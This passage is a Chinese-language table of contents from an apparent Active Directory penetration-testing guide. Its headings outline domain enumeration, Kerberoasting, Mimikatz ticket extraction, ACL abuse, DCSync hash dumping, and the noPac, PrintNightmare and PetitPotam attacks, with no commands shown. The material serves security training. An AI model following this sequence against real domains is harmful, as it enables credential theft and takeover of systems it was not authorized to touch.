class="toc-item toc-level-2"><a class="toc-link" href="#4-Impacket-%E5%B7%A5%E5%85%B7%E5%8C%85"><span class="toc-number">3.4.</span> <span class="toc-text">4. Impacket 工具包</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-psexec-py"><span class="toc-number">3.4.1.</span> <span class="toc-text">使用 psexec.py</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiexec-py"><span class="toc-number">3.4.2.</span> <span class="toc-text">wmiexec.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Windapsearch"><span class="toc-number">3.5.</span> <span class="toc-text">5. Windapsearch</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windapsearch-%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98-%E7%89%B9%E6%9D%83%E7%94%A8%E6%88%B7"><span class="toc-number">3.5.1.</span> <span class="toc-text">Windapsearch - 域管理员&#x2F;特权用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-BloodHound-py"><span class="toc-number">3.6.</span> <span class="toc-text">6. BloodHound.py</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C-BloodHound-py"><span class="toc-number">3.6.1.</span> <span class="toc-text">执行 BloodHound.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-ActiveDirectory-PowerShell-%E6%A8%A1%E5%9D%97"><span class="toc-number">3.7.</span> <span class="toc-text">7. ActiveDirectory PowerShell 模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E6%A8%A1%E5%9D%97"><span class="toc-number">3.7.1.</span> <span class="toc-text">发现模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD-ActiveDirectory-%E6%A8%A1%E5%9D%97"><span class="toc-number">3.7.2.</span> <span class="toc-text">加载 ActiveDirectory 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">3.7.3.</span> <span class="toc-text">获取域信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-ADUser"><span class="toc-number">3.7.4.</span> <span class="toc-text">Get-ADUser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB"><span class="toc-number">3.7.5.</span> <span class="toc-text">检查信任关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.7.6.</span> <span class="toc-text">组枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E7%BB%84%E4%BF%A1%E6%81%AF"><span class="toc-number">3.7.7.</span> <span class="toc-text">详细组信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E6%88%90%E5%91%98%E8%BA%AB%E4%BB%BD"><span class="toc-number">3.7.8.</span> <span class="toc-text">组成员身份</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-PowerView"><span class="toc-number">3.8.</span> <span class="toc-text">8. PowerView</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">3.8.1.</span> <span class="toc-text">域用户信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%92%E5%BD%92%E7%BB%84%E6%88%90%E5%91%98%E8%BA%AB%E4%BB%BD"><span class="toc-number">3.8.2.</span> <span class="toc-text">递归组成员身份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E4%BB%BB%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.8.3.</span> <span class="toc-text">信任枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E6%B5%8B%E8%AF%95"><span class="toc-number">3.8.4.</span> <span class="toc-text">本地管理员访问权限测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%B7%B2%E8%AE%BE%E7%BD%AE-SPN-%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-number">3.8.5.</span> <span class="toc-text">查找已设置 SPN 的用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-SharpView"><span class="toc-number">3.9.</span> <span class="toc-text">9. SharpView</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E6%9C%89%E5%85%B3%E7%89%B9%E5%AE%9A%E7%94%A8%E6%88%B7"><span class="toc-number">3.9.1.</span> <span class="toc-text">枚举有关特定用户</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-Snaffler"><span class="toc-number">3.10.</span> <span class="toc-text">10. Snaffler</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Snaffler-%E6%89%A7%E8%A1%8C"><span class="toc-number">3.10.1.</span> <span class="toc-text">Snaffler 执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Snaffler-%E5%AE%9E%E6%88%98"><span class="toc-number">3.10.2.</span> <span class="toc-text">Snaffler 实战</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-BloodHound"><span class="toc-number">3.11.</span> <span class="toc-text">11. BloodHound</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SharpHound-%E5%AE%9E%E6%88%98"><span class="toc-number">3.11.1.</span> <span class="toc-text">SharpHound 实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Living-Off-the-Land"><span class="toc-number">4.</span> <span class="toc-text">Living Off the Land</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F%E7%9A%84%E7%8E%AF%E5%A2%83%E5%91%BD%E4%BB%A4"><span class="toc-number">4.1.</span> <span class="toc-text">主机与网络侦察的环境命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-PowerShell"><span class="toc-number">4.2.</span> <span class="toc-text">利用 PowerShell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%8D%E7%BA%A7-PowerShell-%E6%9B%B4%E5%8A%A0opsec"><span class="toc-number">4.2.1.</span> <span class="toc-text">降级 PowerShell(更加opsec)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">4.2.2.</span> <span class="toc-text">检查防御措施</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-Defender-%E6%A3%80%E6%9F%A5"><span class="toc-number">4.2.3.</span> <span class="toc-text">Windows Defender 检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-MpComputerStatus"><span class="toc-number">4.2.4.</span> <span class="toc-text">Get-MpComputerStatus</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Am-I-Alone"><span class="toc-number">4.3.</span> <span class="toc-text">Am I Alone?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-qwinsta"><span class="toc-number">4.3.1.</span> <span class="toc-text">使用 qwinsta</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF"><span class="toc-number">4.4.</span> <span class="toc-text">网络信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E7%AE%A1%E7%90%86%E8%A7%84%E8%8C%83-WMI"><span class="toc-number">4.5.</span> <span class="toc-text">Windows 管理规范 (WMI)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Net-Commands"><span class="toc-number">4.6.</span> <span class="toc-text">Net Commands</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E5%9F%9F%E7%BB%84"><span class="toc-number">4.6.1.</span> <span class="toc-text">列出域组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Net-Command%E6%8A%80%E5%B7%A7"><span class="toc-number">4.6.2.</span> <span class="toc-text">Net Command技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dsquery-%E7%94%A8%E6%88%B7-%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%90%9C%E7%B4%A2"><span class="toc-number">4.7.</span> <span class="toc-text">Dsquery 用户&#x2F;计算机搜索</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E6%90%9C%E7%B4%A2"><span class="toc-number">4.7.1.</span> <span class="toc-text">通配符搜索</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E6%9C%89%E7%89%B9%E5%AE%9A%E5%B1%9E%E6%80%A7%E8%AE%BE%E7%BD%AE%E7%9A%84%E7%94%A8%E6%88%B7-PASSWD-NOTREQD"><span class="toc-number">4.7.2.</span> <span class="toc-text">具有特定属性设置的用户 (PASSWD_NOTREQD)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">4.7.3.</span> <span class="toc-text">搜索域控制器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%92%8C%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">5.</span> <span class="toc-text">横向移动和权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting-with-GetUserSPNs-py"><span class="toc-number">5.1.</span> <span class="toc-text">Kerberoasting with GetUserSPNs.py</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-GetUserSPNs-py-%E5%88%97%E5%87%BA-SPN-%E8%B4%A6%E6%88%B7"><span class="toc-number">5.1.1.</span> <span class="toc-text">使用 GetUserSPNs.py 列出 SPN 账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%89%80%E6%9C%89-TGS-%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.1.2.</span> <span class="toc-text">请求所有 TGS 票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%8D%95%E4%B8%AA-TGS-%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.1.3.</span> <span class="toc-text">请求单个 TGS 票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86-TGS-%E7%A5%A8%E6%8D%AE%E4%BF%9D%E5%AD%98%E5%88%B0%E8%BE%93%E5%87%BA%E6%96%87%E4%BB%B6"><span class="toc-number">5.1.4.</span> <span class="toc-text">将 TGS 票据保存到输出文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%88%E5%AF%B9%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E6%B5%8B%E8%AF%95%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">5.1.5.</span> <span class="toc-text">针对域控制器测试身份验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberoasting-%E5%8D%8A%E6%89%8B%E5%8A%A8%E6%96%B9%E6%B3%95"><span class="toc-number">5.2.</span> <span class="toc-text">Kerberoasting - 半手动方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-setspn-exe-%E6%9E%9A%E4%B8%BE-SPN"><span class="toc-number">5.2.1.</span> <span class="toc-text">使用 setspn.exe 枚举 SPN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Targeting-a-Single-User"><span class="toc-number">5.2.2.</span> <span class="toc-text">Targeting a Single User</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-setspn-exe-%E6%A3%80%E7%B4%A2%E6%89%80%E6%9C%89%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.2.3.</span> <span class="toc-text">使用 setspn.exe 检索所有票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Mimikatz-%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.3.</span> <span class="toc-text">使用 Mimikatz 从内存中提取票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E7%94%A8%E4%BA%8E%E7%A0%B4%E8%A7%A3%E7%9A%84-Base64-Blob"><span class="toc-number">5.3.1.</span> <span class="toc-text">准备用于破解的 Base64 Blob</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E8%BE%93%E5%87%BA%E4%BF%9D%E5%AD%98%E4%B8%BA-kirbi-%E6%96%87%E4%BB%B6"><span class="toc-number">5.3.2.</span> <span class="toc-text">将输出保存为 .kirbi 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E7%A0%B4%E8%A7%A3"><span class="toc-number">5.3.3.</span> <span class="toc-text">执行破解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96-%E5%B7%A5%E5%85%B7%E5%8C%96%E8%B7%AF%E7%BA%BF"><span class="toc-number">5.4.</span> <span class="toc-text">自动化&#x2F;工具化路线</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-PowerView-%E6%8F%90%E5%8F%96-TGS-%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.4.1.</span> <span class="toc-text">使用 PowerView 提取 TGS 票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-PowerView-%E9%92%88%E5%AF%B9%E7%89%B9%E5%AE%9A%E7%94%A8%E6%88%B7"><span class="toc-number">5.4.2.</span> <span class="toc-text">使用 PowerView 针对特定用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E6%89%80%E6%9C%89%E7%A5%A8%E6%8D%AE%E5%88%B0-CSV-%E6%96%87%E4%BB%B6"><span class="toc-number">5.4.3.</span> <span class="toc-text">导出所有票据到 CSV 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Rubeus"><span class="toc-number">5.4.4.</span> <span class="toc-text">使用 Rubeus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-stats-%E6%A0%87%E5%BF%97"><span class="toc-number">5.4.5.</span> <span class="toc-text">使用 &#x2F;stats 标志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-nowrap-%E6%A0%87%E5%BF%97"><span class="toc-number">5.4.6.</span> <span class="toc-text">使用 &#x2F;nowrap 标志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%94%AF%E6%8C%81%E7%9A%84%E5%8A%A0%E5%AF%86%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.4.7.</span> <span class="toc-text">检查支持的加密类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B0%E7%A5%A8%E6%8D%AE"><span class="toc-number">5.4.8.</span> <span class="toc-text">请求新票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-Hashcat-%E5%B9%B6%E6%A3%80%E6%9F%A5%E7%A0%B4%E8%A7%A3%E4%BB%BB%E5%8A%A1%E7%8A%B6%E6%80%81"><span class="toc-number">5.4.9.</span> <span class="toc-text">运行 Hashcat 并检查破解任务状态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%A0%B4%E8%A7%A3%E6%89%80%E9%9C%80%E6%97%B6%E9%97%B4"><span class="toc-number">5.4.10.</span> <span class="toc-text">查看破解所需时间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-tgtdeleg-%E6%A0%87%E5%BF%97"><span class="toc-number">5.4.11.</span> <span class="toc-text">使用 &#x2F;tgtdeleg 标志</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ACL%E6%BB%A5%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">ACL滥用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ACL-%E6%9E%9A%E4%B8%BE"><span class="toc-number">6.1.</span> <span class="toc-text">ACL 枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-PowerView-%E6%9E%9A%E4%B8%BE-ACL"><span class="toc-number">6.1.1.</span> <span class="toc-text">使用 PowerView 枚举 ACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainObjectACL"><span class="toc-number">6.1.2.</span> <span class="toc-text">使用 Get-DomainObjectACL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%8F%8D%E5%90%91%E6%90%9C%E7%B4%A2%E4%B8%8E%E6%98%A0%E5%B0%84%E5%88%B0-GUID-%E5%80%BC"><span class="toc-number">6.1.3.</span> <span class="toc-text">执行反向搜索与映射到 GUID 值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Using-the-ResolveGUIDs-Flag"><span class="toc-number">6.1.4.</span> <span class="toc-text">Using the -ResolveGUIDs Flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%9F%9F%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8"><span class="toc-number">6.1.5.</span> <span class="toc-text">创建域用户列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E6%9C%89%E7%94%A8%E7%9A%84-foreach-%E5%BE%AA%E7%8E%AF"><span class="toc-number">6.1.6.</span> <span class="toc-text">一个有用的 foreach 循环</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-damundsen-%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%9E%9A%E4%B8%BE%E6%9D%83%E9%99%90"><span class="toc-number">6.1.7.</span> <span class="toc-text">使用 damundsen 进一步枚举权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainGroup-%E8%B0%83%E6%9F%A5Help-Level-1-Group"><span class="toc-number">6.1.8.</span> <span class="toc-text">使用 Get-DomainGroup 调查Help Level 1 Group</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E6%9F%A5Information-Technology-Group"><span class="toc-number">6.1.9.</span> <span class="toc-text">调查Information Technology Group</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%9C%89%E8%B6%A3%E7%9A%84%E8%AE%BF%E9%97%AE"><span class="toc-number">6.1.10.</span> <span class="toc-text">寻找有趣的访问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ACL-%E6%BB%A5%E7%94%A8%E7%AD%96%E7%95%A5"><span class="toc-number">6.2.</span> <span class="toc-text">ACL 滥用策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA-PSCredential-%E5%AF%B9%E8%B1%A1"><span class="toc-number">6.2.1.</span> <span class="toc-text">创建 PSCredential 对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA-SecureString-%E5%AF%B9%E8%B1%A1"><span class="toc-number">6.2.2.</span> <span class="toc-text">创建一个 SecureString 对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">6.2.3.</span> <span class="toc-text">更改用户密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-damundsen-%E5%88%9B%E5%BB%BA-SecureString-%E5%AF%B9%E8%B1%A1"><span class="toc-number">6.2.4.</span> <span class="toc-text">使用 damundsen 创建 SecureString 对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86-damundsen-%E6%B7%BB%E5%8A%A0%E5%88%B0Help-Desk-Level-1-Group"><span class="toc-number">6.2.5.</span> <span class="toc-text">将 damundsen 添加到Help Desk Level 1 Group</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%99%9A%E5%81%87-SPN"><span class="toc-number">6.2.6.</span> <span class="toc-text">创建虚假 SPN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Rubeus-%E8%BF%9B%E8%A1%8C-Kerberoasting"><span class="toc-number">6.2.7.</span> <span class="toc-text">使用 Rubeus 进行 Kerberoasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cleanup"><span class="toc-number">6.2.8.</span> <span class="toc-text">Cleanup</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8E-adunn-%E7%9A%84%E8%B4%A6%E6%88%B7%E4%B8%AD%E7%A7%BB%E9%99%A4%E4%BC%AA%E9%80%A0%E7%9A%84-SPN"><span class="toc-number">6.2.8.1.</span> <span class="toc-text">从 adunn 的账户中移除伪造的 SPN</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%8E-Help-Desk-Level-1-Group%E4%B8%AD%E7%A7%BB%E9%99%A4-damundsen"><span class="toc-number">6.2.8.2.</span> <span class="toc-text">从 Help Desk Level 1 Group中移除 damundsen</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DCSync"><span class="toc-number">6.3.</span> <span class="toc-text">DCSync</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B-adunn-%E7%9A%84%E7%BB%84%E6%88%90%E5%91%98%E8%BA%AB%E4%BB%BD-Replication%E6%9D%83%E9%99%90"><span class="toc-number">6.3.1.</span> <span class="toc-text">查看 adunn 的组成员身份&#x2F;Replication权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E5%8F%96-NTLM-%E5%93%88%E5%B8%8C%E5%92%8C-Kerberos-%E5%AF%86%E9%92%A5"><span class="toc-number">6.3.2.</span> <span class="toc-text">提取 NTLM 哈希和 Kerberos 密钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-ADUser-%E8%BF%9B%E8%A1%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%9E%9A%E4%B8%BE"><span class="toc-number">6.3.3.</span> <span class="toc-text">使用 Get-ADUser 进行进一步枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Get-DomainUser-%E6%A3%80%E6%9F%A5%E5%8F%AF%E9%80%86%E5%8A%A0%E5%AF%86%E9%80%89%E9%A1%B9"><span class="toc-number">6.3.4.</span> <span class="toc-text">使用 Get-DomainUser 检查可逆加密选项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-runas-exe"><span class="toc-number">6.3.5.</span> <span class="toc-text">使用 runas.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Mimikatz-%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">6.3.6.</span> <span class="toc-text">使用 Mimikatz 执行攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Stacking-The-Deck-%E7%A7%AF%E7%B4%AF%E7%89%B9%E6%9D%83%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90"><span class="toc-number">7.</span> <span class="toc-text">Stacking The Deck(积累特权访问权限)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">7.1.</span> <span class="toc-text">特权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">7.1.1.</span> <span class="toc-text">枚举远程桌面用户组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">7.1.2.</span> <span class="toc-text">枚举远程管理用户组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E-Windows-Linux-%E5%BB%BA%E7%AB%8B-WinRM-%E4%BC%9A%E8%AF%9D"><span class="toc-number">7.1.3.</span> <span class="toc-text">从 Windows&#x2F;Linux 建立 WinRM 会话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Server-%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">7.1.4.</span> <span class="toc-text">SQL Server 管理员</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-PowerUpSQL-%E6%9E%9A%E4%B8%BE-MSSQL-%E5%AE%9E%E4%BE%8B"><span class="toc-number">7.1.4.1.</span> <span class="toc-text">使用 PowerUpSQL 枚举 MSSQL 实例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-xp-cmdshell-%E6%9E%9A%E4%B8%BE%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-number">7.1.4.2.</span> <span class="toc-text">使用 xp_cmdshell 枚举系统中的权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E2%80%9C%E5%8F%8C%E8%B7%B3%E2%80%9D%E9%97%AE%E9%A2%98"><span class="toc-number">7.2.</span> <span class="toc-text">Kerberos“双跳”问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PSCredential-%E5%AF%B9%E8%B1%A1"><span class="toc-number">7.2.0.1.</span> <span class="toc-text">PSCredential 对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C-PSSession-%E9%85%8D%E7%BD%AE"><span class="toc-number">7.2.0.2.</span> <span class="toc-text">注册 PSSession 配置</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%B2%BF%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.3.</span> <span class="toc-text">前沿漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NoPac-SamAccountName-Spoofing"><span class="toc-number">7.3.1.</span> <span class="toc-text">NoPac (SamAccountName Spoofing)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-noPac-%E5%AF%B9%E5%86%85%E7%BD%AE%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C-DCSync"><span class="toc-number">7.3.2.</span> <span class="toc-text">使用 noPac 对内置管理员账户进行 DCSync</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrintNightmare"><span class="toc-number">7.4.</span> <span class="toc-text">PrintNightmare</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BE-MS-RPRN"><span class="toc-number">7.4.0.1.</span> <span class="toc-text">枚举 MS-RPRN</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90-DLL-%E8%BD%BD%E8%8D%B7-%E4%BD%BF%E7%94%A8-smbserver-py-%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB"><span class="toc-number">7.4.0.2.</span> <span class="toc-text">生成 DLL 载荷&#x2F;使用 smbserver.py 创建共享</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PetitPotam-MS-EFSRPC"><span class="toc-number">7.5.</span> <span class="toc-text">PetitPotam (MS-EFSRPC)</span></a><ol 